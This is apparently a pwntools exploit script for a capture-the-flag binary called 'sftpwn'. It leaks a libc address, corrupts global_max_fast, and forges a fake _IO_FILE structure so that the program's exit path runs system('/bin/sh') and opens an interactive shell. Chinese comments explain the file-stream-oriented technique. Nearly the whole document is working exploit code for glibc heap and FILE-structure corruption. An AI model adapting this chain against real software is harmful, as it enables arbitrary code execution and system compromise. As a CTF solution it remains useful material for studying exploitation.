# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './sftpwn'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    file_struct = p32(_flags) + \
             p32(0) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    file_struct = file_struct.ljust(0x88, "\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, "\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, "\x00")
    return file_struct

# one_gad = one_gadget(libc.path)

def attack():
    
    sla('size?' , 0x1430)
    sla('size?' , 0x5000)
    sla('rename?(y/n)\n' , 'y\x00')

    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    binsh_addr = libc.search('/bin/sh').next()
    global_max_fast = libc.address + 0x3ed940

    IO_list_all = libc.symbols['_IO_list_all']
    IO_str_jumps = libc.address + 0x3e8360

    # dbg()

    sla('new name!' , flat(__malloc_hook + 0x70 , global_max_fast - 0x10))

    fake_file = pack_file(_IO_read_base = IO_list_all-0x10,
                    _IO_write_base=0,
                    _IO_write_ptr=1,
                    _IO_buf_base=binsh_addr,
                    _mode=0,)
    fake_file += p64(IO_str_jumps-8)+p64(0)+p64(system_addr)

    # 调用exit，从main函数返回 -> _IO_flush_all_lockp
    # p64(IO_str_jumps-8) 将 IO_FILE_jumps 修改，通过偏移自选调用的函数 ，这里是 _IO_str_finish ，
    # 之后在 _IO_str_finish 中调用 system 函数
    # fsop

    sla('(1:big/2:bigger)' , 1)
    dbg('free')
    se(fake_file[0x10:])


    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   送分题.py
@Time    :   2022/01/23 15:56:04
@Author  :   Niyah 
'''
